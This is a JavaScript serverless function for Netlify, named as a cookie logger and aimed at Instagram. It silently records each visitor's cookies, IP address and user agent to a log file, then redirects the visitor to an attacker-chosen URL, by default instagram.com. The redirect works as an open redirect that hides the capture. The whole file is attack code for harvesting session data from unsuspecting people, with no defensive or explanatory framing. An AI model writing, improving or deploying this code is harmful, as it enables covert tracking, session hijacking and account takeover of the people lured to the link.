// netlify/functions/cookie-logger.js
exports.handler = async (event, context) => {
  const fs = require('fs');
  const path = require('path');

  // Get cookies from the header
  const cookies = event.headers.cookie || '';
  
  // Get the redirect target from the query params or body
  const targetUrl = event.queryStringParameters.target || event.body?.target || 'https://www.instagram.com/';
  
  const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';
  const ua = event.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();

  const logEntry = `[${timestamp}] IP: ${ip} | UA: ${ua} | Cookies: ${cookies}\nTarget: ${targetUrl}\n`;

  const logPath = '/tmp/ig_cookies.log'; // Separate log for IG to keep it clean
  
  try {
    fs.appendFileSync(logPath, logEntry);
    
    // Return the redirect URL
    return {
      statusCode: 302, // Redirect status
      headers: {
        'Location': targetUrl,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ redirect: targetUrl })
    };
  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Failed' })
    };
  }
};
